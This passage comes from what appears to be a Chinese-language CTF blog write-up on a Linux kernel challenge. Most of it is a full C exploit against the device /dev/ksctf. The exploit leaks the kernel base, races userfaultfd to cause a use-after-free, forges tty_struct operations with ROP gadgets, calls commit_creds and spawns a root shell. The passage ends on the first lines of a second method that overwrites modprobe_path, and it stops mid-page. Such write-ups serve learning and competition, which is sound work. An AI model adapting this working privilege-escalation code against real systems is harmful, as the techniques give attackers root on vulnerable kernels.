class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> fake_ops_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> gadget = <span class="number">0xffffffff817d1e76</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = kernel_base + <span class="number">0x13e8030</span> - <span class="number">0x60</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = fake_ops_addr + <span class="number">0x40</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = commit_creds;</span><br><span class="line">        uffd_buf[<span class="number">5</span>] = init_creds;</span><br><span class="line">        uffd_buf[<span class="number">7</span>] = add_rsp_188_pop_rbx_ret;</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[5]&quot;</span>, uffd_buf[<span class="number">5</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> get_root_func = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x19e1180</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line">    </span><br><span class="line">    work_for_cpu_fn  = kernel_base + <span class="number">0x8c360</span>;</span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">35</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    fake_ops_addr = heap_addr - <span class="number">0x68</span>;</span><br><span class="line">    hexx(<span class="string">&quot;fake_ops_addr&quot;</span>, fake_ops_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    orignal[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">    orignal[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">2</span>] = heap_addr - <span class="number">0x2a5540</span>;</span><br><span class="line">    orignal[<span class="number">3</span>] = kernel_base + <span class="number">0x1073e00</span>;</span><br><span class="line">    orignal[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   pop_rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   init_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   16;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   0xfffffe0000010f58;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   0xfffffe0000010f58;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   tty_fd;&quot;</span>        </span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    hexx(<span class="string">&quot;UID&quot;</span>, getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="notes-leak-userfaultfd-tty-struct-modprobe-path"><a href="#notes-leak-userfaultfd-tty-struct-modprobe-path" class="headerlink" title="notes leak + userfaultfd + tty_struct + modprobe_path"></a>notes leak + userfaultfd + tty_struct + modprobe_path</h2><h3 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h3><p>好，我这个人比较懒，不想进行两次栈迁移，而且现在假设这道题目的 pt_regs 开启了随机化(<font style="color:rgb(44, 62, 80);">CONFIG_RANDOMIZE_KSTACK_OFFSET&#x3D;y</font>)，每次在栈上的偏移都不一样，这个时候就有请我们的 <code>modprobe_path</code> 登场了。只要我们能够修改这个地方的值，我们就能够变向的将 <code>flag</code> 的权限提升到普通都可以读取，那我们要如何修改这个地方的值呢？我们找到了一个很好用的 <code>gadget</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffff810f69f1</span>: mov qword ptr [rdx + <span class="number">8</span>], rsi; ret;</span><br></pre></td></tr></table></figure><p>当我们执行 <code>iotcl(tty_fd, var1, var2)</code> 的时候，<code>rdx</code> 和 <code>rsi</code> 是可控的，也就是说我们可以通过《类似于》 <code>ioctl(tty_fd, &quot;/tmp/sh&quot;, modprobe_path - 8);</code> 来实现对 <code>modprobe_path</code> 的修改</p><img src="/2024/10/07/kno_puts/4.png" class="" title="我的图图呢">  <p>由于 <code>ioctl</code> 的 <code>rsi</code> 传进去的最终只有四字节，所以我们要分段传两次</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span 